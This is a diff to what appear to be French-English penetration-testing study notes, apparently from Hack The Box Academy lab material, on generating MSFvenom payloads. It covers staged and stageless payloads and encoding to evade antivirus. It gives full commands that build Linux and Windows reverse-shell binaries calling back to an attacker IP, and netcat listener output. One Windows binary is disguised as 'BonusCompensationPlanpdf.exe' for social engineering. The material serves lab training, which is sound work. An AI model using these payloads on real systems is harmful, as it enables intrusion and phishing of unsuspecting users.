@@ -4,7 +4,9 @@
 
 Une méthode consiste à utiliser **MSFvenom**, un outil qui permet de créer des payloads personnalisés que l'on peut envoyer par des moyens comme un email ou des techniques d'ingénierie sociale, incitant ainsi l'utilisateur à exécuter le fichier.
 
+{% hint style="info" %}
 **MSFvenom** offre aussi la possibilité de chiffrer et d'encoder les payloads pour contourner les antivirus et autres systèmes de détection de signature malveillante. Cela permet de livrer des payloads de manière plus discrète et efficace.
+{% endhint %}
 
 ***
 
@@ -26,19 +28,19 @@ mrroboteLiot@htb[/htb]$ msfvenom -l payloads
 
 #### <mark style="color:green;">Payloads avec étapes (Staged)</mark>
 
-Les payloads avec étapes fonctionnent en deux parties. D'abord, une petite portion du **payload** est envoyée à la cible. Une fois cette première étape exécutée, cette partie fait appel à l'ordinateur de l'attaquant pour télécharger le reste du payload via le réseau. Par exemple, dans le cas d’un **payload** comme `linux/x86/shell/reverse_tcp`, la première étape consiste à envoyer un morceau qui établit une connexion entre la cible et l'attaquant. Ensuite, la cible télécharge et exécute le reste du code pour ouvrir une "reverse shell" (une connexion permettant à l'attaquant de contrôler la cible).
-
-L’avantage des **payloads staged** est qu'ils permettent d'envoyer de petites portions au début, ce qui peut être utile pour les systèmes avec des restrictions de mémoire. Cependant, cela peut aussi rendre la connexion instable si le réseau est lent ou si le système cible n’a pas assez de mémoire pour gérer plusieurs étapes.
+* Les **payloads staged** fonctionnent en deux étapes : un **stager** (petit code initial) puis le **stage** (le reste du payload téléchargé/exécuté).
+* Le stager établit la connexion initiale vers l’attaquant (par ex. pour `linux/x86/shell/reverse_tcp`), puis récupère et lance le stage qui ouvre la reverse shell.
+* Avantage : le stager est petit — utile sur des systèmes avec peu de mémoire ou contraintes d’espace.
+* Inconvénient : dépendance au réseau et à la stabilité — si le téléchargement échoue ou la mémoire manque, l’attaque peut devenir instable.
 
 #### <mark style="color:green;">Payloads sans étapes (Stageless)</mark>
 
-Les **payloads stageless**, quant à eux, n’ont pas de plusieurs étapes. Tout le **payload** est envoyé d'un coup et exécuté immédiatement sur la cible. Par exemple, avec un **payload** comme `linux/zarch/meterpreter_reverse_tcp`, tout le code nécessaire pour établir la connexion et prendre le contrôle de la machine est envoyé en une seule fois, sans étapes intermédiaires.
+* Les **payloads stageless** envoient **tout le code d’un coup** et s’exécutent immédiatement sur la cible — pas de stager ni de téléchargement supplémentaire.
+* Avantages : plus **stables** sur des réseaux lents/latents (pas de dépendance à plusieurs étapes) et **moins de trafic réseau** observable, ce qui peut aider à l’évasion.
+* Inconvénients : le payload complet peut être plus volumineux et nécessiter plus de mémoire pendant l’exécution.
+* Choix pratique : dans des environnements à faible bande passante ou à latence élevée, un **stageless** est souvent préférable ; dans d’autres cas le staged peut réduire la taille initiale envoyée.
 
-Les **payloads stageless** sont souvent plus stables dans des environnements où la connexion réseau est lente ou instable, car ils ne dépendent pas d'étapes multiples et de connexions répétées. De plus, ils peuvent parfois mieux échapper aux systèmes de détection, car ils génèrent moins de trafic réseau.
-
-This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering.
-
-#### Comment identifier un payload staged ou stageless ?
+#### <mark style="color:green;">Comment identifier un payload staged ou stageless ?</mark>
 
 Dans Metasploit, le nom du payload peut souvent indiquer s'il est staged ou stageless. Par exemple :
 
@@ -56,13 +58,11 @@ Les **payloads stageless** sont plus simples et peuvent être utiles quand les c
 
 ### <mark style="color:red;">Building A Stageless Payload</mark>
 
-Now let's build a simple stageless payload with msfvenom and break down the command.
-
 <mark style="color:green;">**Build It**</mark>
 
 {% code fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
 ```
 {% endcode %}
 
@@ -125,8 +125,6 @@ Creates the .elf binary and names the file createbackup. We can name this file w
 
 Once the file is on that system, it will also need to be executed.
 
-Imagine for a moment: the target machine is an Ubuntu box that an IT admin uses to manage network devices (hosting configuration scripts, accessing routers & switches, etc.). We could get them to click the file in an email we sent because they were carelessly using this system as if it was a personal computer or workstation.
-
 **Ubuntu Payload**
 
 ![image](https://academy.hackthebox.com/storage/modules/115/ubuntupayload.png)
@@ -150,16 +148,7 @@ Listening on 0.0.0.0 443
 Connection received on 10.129.138.85 60892
 env
 PWD=/home/htb-student/Downloads
-cd ..
-ls
-Desktop
-Documents
-Downloads
-Music
-Pictures
-Public
-Templates
-Videos
+--------------------------------
 ```
 
 This same concept can be used to create payloads for various platforms, including Windows.
@@ -168,13 +157,11 @@ This same concept can be used to create payloads for various platforms, includin
 
 ### <mark style="color:red;">Building a simple Stageless Payload for a Windows system</mark>
 
-We can also use msfvenom to craft an executable (`.exe`) file that can be run on a Windows system to provide a shell.
-
 <mark style="color:green;">**Windows Payload**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -201,19 +188,4 @@ mrroboteLiot@htb[/htb]$ sudo nc -lvnp 443
 
 Listening on 0.0.0.0 443
 Connection received on 10.129.144.5 49679
-Microsoft Windows [Version 10.0.18362.1256]
-(c) 2019 Microsoft Corporation. All rights reserved.
-
-C:\Users\htb-student\Downloads>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is DD25-26EB
-
- Directory of C:\Users\htb-student\Downloads
-
-09/23/2021  10:26 AM    <DIR>          .
-09/23/2021  10:26 AM    <DIR>          ..
-09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
-               1 File(s)         73,802 bytes
-               2 Dir(s)   9,997,516,800 bytes fre
 ```
